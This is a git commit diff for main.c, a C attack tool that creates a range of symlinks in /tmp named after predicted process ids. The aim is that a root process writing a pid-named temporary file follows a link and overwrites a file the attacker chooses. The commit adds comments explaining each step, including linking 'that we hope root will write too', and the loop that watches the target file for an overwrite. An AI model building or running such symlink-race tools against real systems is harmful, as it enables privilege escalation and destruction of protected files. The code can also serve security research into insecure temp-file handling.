f180df075379b0a6d43782a0b4a1484753e1a47c
Larry Cashdollar <larry0@me.com>
2019-10-24 17:05:17 -0400

    Documenting code

--- main.c
+++ main.c
@@ -8,12 +8,10 @@
 #include <dirent.h>
 
 
-/*symlink creator to abuse files creation in /tmp where the pid is used
-in the filename.
-First we need to take arguments that consist of a range of numbers
-and a filename to link from and a filename to link to.
-
-Add monitoring of writes to linked files?
+/*
+Symlink creator to abuse files creation in /tmp where the pid is used in the filename.
+First we need to take arguments that consist of a range of numbers and a filename to 
+link from and a filename to link to.
 */
 
 extern int errno;
@@ -44,7 +42,7 @@ main (int argc, char **argv)
     }
 
   to = atoi (argv[1]);
-  to = from + to;
+  to = from + to; //Add the number of links we want to create to our pid as a starting point.
 
   printf ("Starting from our own process id: %d\n", from);
 
@@ -56,10 +54,11 @@ main (int argc, char **argv)
       return (-1);
     }
 
-  t_time = buf.st_mtim.tv_sec;
-  snprintf (start_time, 25, "%s", ctime (&t_time));
+  t_time = buf.st_mtim.tv_sec; //store this as a string in start_time below and
+  snprintf (start_time, 25, "%s", ctime (&t_time)); //truncate the \n from the timestamp
 
-  t_time_watch = buf.st_mtim.tv_sec;
+  t_time_watch = buf.st_mtim.tv_sec; 
+  //Create our block of symlinks that we hope root will write too.
   for (x = from; x <= to; x++)
     {
       sprintf (from_name, "/tmp/%s%d", argv[2], x);
@@ -68,16 +67,16 @@ main (int argc, char **argv)
 
       if (result < 0)
 	{
-
 	  printf ("Error: %d, %s\n", result, strerror (errno));
 	  return (-1);
 	}
-
     }
 
+  printf("Waiting on a write to one of our predicted links in /tmp or pid to grow past the links we created.\n");
+// Watch the target file to see if it's over written and check to see if the newest process pid
+// is larger than our biggest predicted pid.  If so exit because we failed.
   while (t_time == t_time_watch)
     {
-
       i = stat (dest_name, &buf);
       t_time_watch = buf.st_mtim.tv_sec;
       if (get_latest_pid() > to) {
